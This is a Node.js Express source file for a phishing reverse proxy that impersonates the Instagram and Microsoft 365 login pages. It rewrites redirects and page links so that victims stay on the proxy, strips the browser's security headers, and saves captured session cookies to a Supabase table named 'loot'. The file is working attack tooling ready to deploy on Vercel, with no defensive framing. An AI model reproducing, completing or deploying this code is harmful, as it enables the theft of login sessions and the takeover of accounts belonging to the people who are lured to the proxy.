require("dotenv").config();
const express = require("express");
const {
  createProxyMiddleware,
  responseInterceptor,
} = require("http-proxy-middleware");
const { createClient } = require("@supabase/supabase-js");
const targets = require("./targets");

const app = express();

// --- 1. Supabase Initialization ---
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY,
);

// --- 2. Persistence Logic ---
const saveLoot = async (siteKey, cookies, url) => {
  const trimmedCookies = cookies.map((c) => c.split(";")[0]);

  try {
    const { error } = await supabase.from("loot").insert([
      {
        site: targets[siteKey].name,
        path: url,
        data: trimmedCookies,
        timestamp: new Date().toISOString(),
      },
    ]);

    if (error) throw error;
    console.log(`[🔥 GOLDEN LOOT CAPTURED] ${targets[siteKey].name}`);
  } catch (e) {
    console.error("Supabase Save Failed:", e.message);
  }
};

// --- 3. Global Headers & CORS ---
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "*");
  res.header("Access-Control-Allow-Credentials", "true");
  res.header(
    "Content-Security-Policy",
    "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data: blob:;",
  );
  req.headers["accept-encoding"] = "identity";
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// --- 4. The Proxy Engine ---
const igProxy = createProxyMiddleware({
  target: targets.ig.url, // This gets overridden by the logic below
  changeOrigin: true,
  secure: false,
  selfHandleResponse: true,
  onProxyReq: (proxyReq, req, res) => {
    const isMS = req.url.startsWith("/ms");
    const targetHost = isMS ? "login.microsoftonline.com" : "www.instagram.com";

    proxyReq.setHeader("Origin", `https://${targetHost}`);
    proxyReq.setHeader("Referer", `https://${targetHost}/`);
  },
  onProxyRes: responseInterceptor(
    async (responseBuffer, proxyRes, req, res) => {
      // ... (Keep your Golden Cookie and Loot Logic from before) ...

      // --- Rewrite Redirects ---
      // If Microsoft tries to send the user to https://login.microsoftonline.com/common...
      // We change it to http://localhost:3001/ms/common...
      if (proxyRes.headers.location) {
        const isMS = req.url.startsWith("/ms");
        const rewriteTarget = isMS
          ? "login.microsoftonline.com"
          : "www.instagram.com";
        const prefix = isMS ? "/ms" : "";

        proxyRes.headers.location = proxyRes.headers.location.replace(
          `https://${rewriteTarget}`,
          `http://${req.headers.host}${prefix}`,
        );
      }

      // --- HTML Rewriting ---
      if (proxyRes.headers["content-type"]?.includes("text/html")) {
        let html = responseBuffer.toString("utf8");
        const host = req.headers.host;
        const isMS = req.url.startsWith("/ms");
        const targetHost = isMS
          ? "login.microsoftonline.com"
          : "www.instagram.com";
        const prefix = isMS ? "/ms" : "";

        return html
          .replace(
            new RegExp(`https://${targetHost}`, "g"),
            `http://${host}${prefix}`,
          )
          .replace(/href="\//g, `href="http://${host}${prefix}/`)
          .replace(/src="\//g, `src="http://${host}${prefix}/`);
      }
      return responseBuffer;
    },
  ),
});
// --- 5. Route Mapping ---
app.use(express.json());

app.use("/", (req, res, next) => {
  if (req.url.startsWith("/ms")) {
    return createProxyMiddleware({
      target: targets.ms.url,
      changeOrigin: true,
      pathRewrite: { "^/ms": "" },
    })(req, res, next);
  }
  return igProxy(req, res, next);
});

// VERCEL REQUIREMENT: Export app
module.exports = app;

// LOCAL TESTING
if (require.main === module) {
  const PORT = process.env.PORT || 3001;
  app.listen(PORT, () => {
    console.log(`🚀 Local Proxy Server running at http://localhost:${PORT}`);
    console.log(`🔗 Testing Instagram at http://localhost:${PORT}/ig`);
  });
}
